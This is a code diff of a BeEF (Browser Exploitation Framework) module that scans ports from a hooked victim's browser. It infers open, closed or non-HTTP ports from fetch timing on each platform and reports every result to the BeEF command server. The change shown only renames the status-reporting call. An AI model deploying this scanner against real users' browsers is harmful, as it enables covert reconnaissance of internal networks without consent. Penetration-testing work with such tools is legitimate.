@@ -62,7 +62,7 @@ beef.execute(function() {
     function fetch_scan(hostname, port_) {
         // check if port that is to be scanned is part of the banned list and report back to the BeEF server
         if (check_blocked(parseInt(port_))) {
-            beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": is a blocked port and won't be scanned", beef.are.status_success());
+            beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": is a blocked port and won't be scanned", beef.status.success());
             return;
         }
         // define an AbortController to handle timeouts and to terminate connections [currently set to 5 seconds]
@@ -84,14 +84,14 @@ beef.execute(function() {
                 // If there is a status returned then Mozilla Firefox 68.5.0esr made a successful connection HTTP based or not
                 // and or Chrome received HTTP based traffic.
                 if (res.status === 0) {                 
-                    beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open", beef.are.status_success());
+                    beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open", beef.status.success());
                 }
             })
                 // If an error occurred with the fetch this could be due to reaching the time out, the port being closed or non HTTP traffic.
                 .catch(err => {
                     // Alert BeEF if we are giving up due to the port not responding for N seconds
                     if (signal.aborted === true) {
-                        beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": Giving up on port due to Timeout", beef.are.status_success());
+                        beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": Giving up on port due to Timeout", beef.status.success());
               }
                     else {
                         // We need to capture how long it took to fail ASAP to get an idea on timing differences
@@ -101,14 +101,14 @@ beef.execute(function() {
                         if (isFirefox === true) {
                     if (navigator.platform === 'Win32') {
                                 if ((end - start) > 600 ) {
-                                     beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.are.status_success());
+                                     beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.status.success());
                     }
                     else {
-                                     beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open but not HTTP", beef.are.status_success());
+                                     beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open but not HTTP", beef.status.success());
                     }
                     }
                     else {
-                            beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.are.status_success());
+                            beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.status.success());
                     }
                   }
                         else {
@@ -118,23 +118,23 @@ beef.execute(function() {
                       // // check if windows or linux
                        if (navigator.platform === 'Win32') {
                              if ((end - start) > 121 ) {
-                                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.are.status_success());
+                                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.status.success());
                              }
                              else {
-                                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open but does not communicate via HTTP", beef.are.status_success());
+                                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open but does not communicate via HTTP", beef.status.success());
                              }
                }
                        else if (navigator.platform.toLowerCase().includes('linux')) {
                        // this is for linux
                              if ((end - start) < 11 ) {
-                                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.are.status_success());
+                                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.status.success());
                              }
                              else {
-                                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open but does not communicate via HTTP", beef.are.status_success());
+                                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open but does not communicate via HTTP", beef.status.success());
                              }
                        }
                        else {
-                           beef.net.send("<%= @command_url %>", <%= @command_id %>,"Module hasn't been tested against this browser.", beef.are.status_success());
+                           beef.net.send("<%= @command_url %>", <%= @command_id %>,"Module hasn't been tested against this browser.", beef.status.success());
                }
                         }
               }
